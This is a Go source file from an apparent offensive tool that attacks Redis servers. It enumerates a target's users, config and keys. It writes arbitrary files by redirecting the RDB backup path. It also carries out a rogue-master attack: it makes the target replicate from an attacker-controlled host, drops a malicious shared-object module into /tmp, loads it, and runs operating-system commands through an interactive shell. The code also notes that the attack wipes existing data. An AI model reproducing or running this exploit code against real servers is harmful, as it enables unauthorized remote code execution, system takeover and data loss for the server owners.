package core

import (
	"context"
	"davinci/common"
	"davinci/common/log"
	redis2 "davinci/core/redis"
	"encoding/hex"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/redis/go-redis/v9"
	"reflect"
	"strconv"
	"strings"
)

type Redis struct {
	conn    *redis.Client
	Host    string
	Port    int
	User    string
	Passwd  string
	Cmd     string
	context context.Context
}

func (r *Redis) connect() error {
	if r.conn == nil {
		log.Info("connecting target...")
		r.context = context.Background()
		r.conn = redis.NewClient(&redis.Options{
			Addr:     fmt.Sprintf("%s:%d", r.Host, r.Port),
			Password: r.Passwd,
			Username: r.User,
		})
		if _, err := r.conn.Ping(r.context).Result(); err != nil {
			log.Error("redis connect err: ", err)

			return err
		}
	}
	return nil
}

func (r *Redis) Close() {
	if r.conn != nil {
		r.conn.Close()
		r.conn = nil
	}
}

func (r *Redis) ExecuteOnce() {
	if r.connect() != nil {
		return
	}
	result, err := r.execute(r.Cmd)
	if err == nil {
		log.Output(result)
	} else {
		log.Error(err)
	}
}

func (r *Redis) AutoGather() {
	if r.connect() != nil {
		return
	}
	log.Output(r.getUsers())
	log.Output(r.info())
	log.Output(r.dbsize())
	log.Output(r.getAllKeys())
}

func (r *Redis) Shell() {
	if r.connect() != nil {
		return
	}
	pmt := prompt.New(func(in string) {},
		func(document prompt.Document) []prompt.Suggest {
			return []prompt.Suggest{}
		})

	for {
		in := strings.Trim(pmt.Input(), " ")
		if in == "" {
			continue
		}
		if strings.EqualFold(in, "exit") || strings.EqualFold(in, "exit()") {
			break
		} else {
			result, err := r.execute(in)
			if err == nil {
				if result != nil {
					log.Output(result)
				}
			} else {
				log.Error(err)
			}
		}

	}
}

func (r *Redis) SetHost(host string) {
	r.Host = host
}
func (r *Redis) SetPort(port int) {
	r.Port = port
}

func (r *Redis) SetCmd(cmd string) {
	r.Cmd = cmd
}

func (r *Redis) getUsers() []string {
	var result = []string{"users (ACL USERS)"}
	res, err := r.execute("ACL USERS")
	if err == nil {
		if reflect.TypeOf(res).Kind() == reflect.Slice {
			for _, user := range res.([]interface{}) {
				result = append(result, user.(string))
			}
		} else {
			result = append(result, res.(string))
		}
		return result
	} else {
		log.Warn(err)
		return []string{}
	}

}

func (r *Redis) getAllKeys() []string {
	var result = []string{"all keys (SCAN 0)"}
	res, err := r.execute("SCAN 0")
	if err == nil {
		if reflect.TypeOf(res).Kind() == reflect.Slice {
			keys := res.([]interface{})[1]
			for _, key := range keys.([]interface{}) {
				result = append(result, key.(string))
			}
		} else {
			result = append(result, res.(string))
		}

		return result
	} else {
		log.Warn(err)
		return []string{}
	}
}

func (r *Redis) dbsize() []string {
	var result string
	res, err := r.execute("dbsize")
	if err == nil {
		if reflect.TypeOf(res).Kind() == reflect.Int64 {
			result = strconv.FormatInt(res.(int64), 10)
		} else {
			result = res.(string)
		}
		return []string{"dbsize", result}
	} else {
		log.Warn(err)
		return []string{}
	}
}

func (r *Redis) info() []string {
	res, err := r.execute("info")
	if err == nil {
		info := strings.Replace(res.(string), "\r", "", -1)
		result := strings.Split(info, "\n")
		return append([]string{"info"}, result...)
	} else {
		log.Warn(err)
		return []string{}
	}
}

func (r *Redis) execute(cmd string) (interface{}, error) {

	var err error
	var cmds []interface{}
	args := common.DelEmptyEle(common.SplitCmd(cmd, ' '))
	for _, arg := range args {
		cmds = append(cmds, common.ResolveEscapeCharacters(arg))
	}
	log.Info("execute: ", cmds)
	redisCmd := redis.NewCmd(r.context, cmds...)
	if err = r.conn.Process(r.context, redisCmd); err == nil {
		return redisCmd.Result()
	}
	return nil, err
}

/**
* 通过rdb备份写文件
 */
func (r *Redis) WriteFile_by_RDBBack(file string, data []byte) {
	if r.connect() != nil {
		return
	}
	var randKey string
	dir, dbfilename := common.SplitFilePath(file)
	srcDirRes, err1 := r.execute("config get dir")
	srcDbfilenameRes, err2 := r.execute("config get dbfilename")
	if err1 != nil || err2 != nil {
		log.Warn(err1, err2)
		return
	}
	randKey = common.GetRandomString(8)
	for {
		_, err := r.execute(fmt.Sprintf("get %s", randKey))
		if err != nil {
			break
		}
		randKey = common.GetRandomString(8)
	}
	defer r.recovery(randKey, srcDirRes, srcDbfilenameRes)
	err3 := r.setConfig("dir", dir)
	err4 := r.setConfig("dbfilename", dbfilename)
	if err3 != nil || err4 != nil {
		log.Warn(err3, err4)
		return
	}
	log.Info("set dir and dbfilename success")

	r.execute(fmt.Sprintf("set %s \"\n\n\n%s\n\n\n\"", randKey, string(data)))
	if result, err := r.execute("bgsave"); err == nil {
		log.Output(result)
		log.Info("writefile success")
	} else {
		log.Warn("execute bgsave fail: ", err)
	}
}

/**
* 通过主从模式写文件
* version>=2.8支持主从模块
* 会清空原有数据
* 可写二进制文件，无其他脏数据
 */
func (r *Redis) WriteFile_by_RogueMaster(file, rogueServerIp string, rogueServerPort int, data []byte, backup bool) {
	if r.connect() != nil {
		return
	}
	// 备份数据
	if backup {
		backupFile := "./redis-backup_" + common.GetRandomString(6) + ".txt"
		if r.DumpBackup(backupFile) != nil {
			log.Warn("backup redis error")
			return
		} else {
			log.Info("backup data: ", backupFile)
			log.Info("you can restore it with the following command: redis-cli --pipe < redis-backup.txt")
		}
	}
	// 数据长度<=8会导致redis崩溃，默认用空格补充
	minimumLength := 9
	if len(data) <= minimumLength {
		log.Warn("data length less than 9 will cause redis to crash, auto padding space")
		data = append(data, []byte(strings.Repeat(" ", minimumLength-len(data)))...)
	}
	// 备份原始配置
	dir, dbfilename := common.SplitFilePath(file)
	srcDirRes, err1 := r.execute("config get dir")
	srcDbfilenameRes, err2 := r.execute("config get dbfilename")
	if err1 != nil || err2 != nil {
		log.Warn(err1, err2)
		return
	}
	defer r.recovery("", srcDirRes, srcDbfilenameRes)
	// 利用主从复制写文件
	err3 := r.setConfig("dir", dir)
	err4 := r.setConfig("dbfilename", dbfilename)
	if err3 != nil || err4 != nil {
		log.Warn(err3, err4)
		return
	}
	//port, _ := common.GetAvailablePort()
	log.Info(fmt.Sprintf("rogue redis master  %s:%d", rogueServerIp, rogueServerPort))
	rogueServer := redis2.CreateRogueserver(rogueServerPort, data)
	if rogueServer == nil {
		return
	}
	log.Info("(local) waiting for connection")
	done := make(chan struct{})
	go rogueServer.Handle(done)
	r.execute(fmt.Sprintf("SLAVEOF %s %d", rogueServerIp, rogueServerPort))
	<-done
	log.Info("writefile success")
	r.execute(fmt.Sprintf("SLAVEOF NO ONE"))
}

/**
* 通过redis-dump备份数据
 */
func (r *Redis) DumpBackup(backfile string) error {
	return redis2.RedisDump(r.Host, r.Port, r.User, r.Passwd, backfile)
}

func (r *Redis) recovery(key string, srcDirRes, srcDbfilenameRes interface{}) {
	log.Info("recovery")
	// 还原新增的key
	if key != "" {
		r.execute(fmt.Sprintf("del %s", key))
	}
	// 还原config
	var srcDir, srcDbfilename string
	switch srcDirRes.(type) {
	case []interface{}:
		srcDir = srcDirRes.([]interface{})[1].(string)
		srcDbfilename = srcDbfilenameRes.([]interface{})[1].(string)
	case map[interface{}]interface{}:
		srcDir = srcDirRes.(map[interface{}]interface{})["dir"].(string)
		srcDbfilename = srcDbfilenameRes.(map[interface{}]interface{})["dbfilename"].(string)
	default:
		log.Error(" unkown response type:  ", srcDirRes)
		return
	}
	r.execute(fmt.Sprintf("config set dir %s", srcDir))
	r.execute(fmt.Sprintf("config set dbfilename %s", srcDbfilename))
}

func (r *Redis) setConfig(key, value string) error {
	res, err := r.execute(fmt.Sprintf("config set %s %s", key, value))
	if err != nil {
		return err
	}
	if !strings.Contains(strings.ToLower(res.(string)), "ok") {
		return fmt.Errorf(res.(string))
	}
	return nil
}

/**
* 利用主从复制写入动态链接库并进行加载
 */
func (r *Redis) loadMod_by_RogueMaster(rogueServerIp string, rogueServerPort int, backup bool) error {

	info := r.info()
	os := r.getOs(info)
	platform := r.getPlatform(info)
	moduleHex := redis2.GetRedisModule(os, platform)
	if moduleHex == "" {
		return fmt.Errorf("get module so error")
	}
	evalFile := "/tmp/module_" + common.GetRandomString(6) + ".so"
	evalData, err := hex.DecodeString(moduleHex)
	if err != nil {
		return err
	}
	r.WriteFile_by_RogueMaster(evalFile, rogueServerIp, rogueServerPort, evalData, backup)
	res, err := r.execute(fmt.Sprintf("module load %s", evalFile))
	if err != nil {
		return err
	}
	if !strings.Contains(strings.ToLower(res.(string)), "ok") {
		return fmt.Errorf(res.(string))
	}
	log.Info("load modlue success")
	return nil
}

func (r *Redis) OsExec_RogueMaster(rogueServerIp, cmd string, rogueServerPort int, interactive, backup bool) error {
	if r.connect() != nil {
		return fmt.Errorf("connect redis fail")
	}

	if !r.isModLoaded("system") {
		if err := r.loadMod_by_RogueMaster(rogueServerIp, rogueServerPort, backup); err != nil {
			log.Error(err)
			return err
		}
	}
	if interactive {
		pmt := prompt.New(func(in string) {},
			func(document prompt.Document) []prompt.Suggest {
				return nil
			})

		for {
			in := pmt.Input()
			if strings.EqualFold(in, "exit") || strings.EqualFold(in, "exit()") {
				break
			}
			if strings.Trim(in, " ") == "" {
				continue
			}
			if result, err := r.execute(fmt.Sprintf("system.exec \"%s\"", in)); err == nil {
				log.Output(result)
			} else {
				log.Warn(err)
			}
		}
	} else {
		if result, err := r.execute(fmt.Sprintf("system.exec \"%s\"", cmd)); err == nil {
			log.Output(result)
		} else {
			log.Warn(err)
		}
	}

	return nil
}

func (r *Redis) isModLoaded(name string) bool {
	if modulelist, err := r.execute("module list"); err != nil {
		log.Warn(err)
		return false
	} else {
		modLoaded := false
		for _, moduleStruct := range modulelist.([]interface{}) {
			module := moduleStruct.([]interface{})
			if len(module) < 2 {
				continue
			}
			if module[1].(string) == name {
				modLoaded = true
				break
			}
		}
		log.Info("modLoaded: ", modLoaded)
		return modLoaded
	}
}

func (r *Redis) getVersion(info []string) string {
	for _, line := range info {
		if strings.HasPrefix(line, "redis_version:") {
			splits := strings.Split(line, ":")
			return splits[1]
		}
	}
	return ""
}

func (r *Redis) getOs(info []string) string {
	for _, line := range info {
		if strings.HasPrefix(line, "os:") {
			splits := strings.Split(line, ":")
			if strings.Contains(strings.ToLower(splits[1]), "linux") {
				return "linux"
			} else if strings.Contains(strings.ToLower(splits[1]), "windows") {
				return "windows"
			}
			return strings.ToLower(splits[1])
		}
	}
	return ""
}

func (r *Redis) getPlatform(info []string) string {
	for _, line := range info {
		if strings.HasPrefix(line, "os:") {
			splits := strings.Split(line, ":")
			tmp := strings.Split(splits[1], " ")
			platform := tmp[len(tmp)-1]
			return platform
		}
	}
	//for _, line := range info {
	//	if strings.HasPrefix(line, "arch_bits:") {
	//		splits := strings.Split(line, ":")
	//		return splits[1]
	//	}
	//}
	return ""
}
